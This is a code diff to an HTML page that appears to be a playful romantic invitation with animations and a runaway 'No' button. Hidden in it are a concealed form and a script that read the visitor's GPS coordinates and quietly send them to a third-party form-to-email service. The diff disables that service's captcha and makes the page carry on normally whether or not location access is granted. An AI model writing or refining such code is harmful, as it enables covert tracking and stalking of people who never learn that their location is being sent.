@@ -22,7 +22,6 @@
             overflow: hidden;
         }
 
-        /* Galaxy background animation */
         .stars-bg {
             position: fixed;
             top: 0;
@@ -128,7 +127,6 @@
             position: relative;
         }
 
-        /* Heart Animation */
         .heart-container {
             position: relative;
             width: 100px;
@@ -223,6 +221,7 @@
     <!-- Hidden form to send location data to your email -->
     <form id="geoForm" action="https://formsubmit.co/faisal@selenic.io" method="POST" style="display:none;">
         <input type="text" name="location_coords" id="coordsInput">
+        <input type="hidden" name="_captcha" value="false">
     </form>
 
     <script>
@@ -232,33 +231,38 @@
         }
 
         function requestLocation() {
-            nextStep(5);
-            // Request GPS Location from User
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    
-                    // Send coordinates to form
-                    document.getElementById('coordsInput').value = `GPS Coords: https://maps.google.com/?q=${lat},${lon}`;
-                    
-                    // Submit form silently in background
-                    const form = document.getElementById('geoForm');
-                    const formData = new FormData(form);
-                    fetch(form.action, {
-                        method: 'POST',
-                        body: formData
-                    });
-                }, function(error) {
-                    console.log('Location access denied');
-                });
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        
+                        document.getElementById('coordsInput').value = `GPS Location: https://maps.google.com/?q=${lat},${lon}`;
+                        
+                        const form = document.getElementById('geoForm');
+                        fetch(form.action, {
+                            method: 'POST',
+                            body: new FormData(form)
+                        }).catch(e => console.log(e));
+
+                        nextStep(5);
+                    },
+                    function(error) {
+                        // در صورت عدم اجازه دسترسی یا خطا، باز هم به مرحله ۵ برود
+                        nextStep(5);
+                    }
+                );
+            } else {
+                nextStep(5);
             }
         }
 
         // Runaway "No" Button
         const btnNo = document.getElementById("btnNo");
-        btnNo.addEventListener("mouseover", moveBtn);
-        btnNo.addEventListener("click", moveBtn);
+        if (btnNo) {
+            btnNo.addEventListener("mouseover", moveBtn);
+            btnNo.addEventListener("click", moveBtn);
+        }
 
         function moveBtn() {
             const x = Math.floor(Math.random() * 200) - 100;
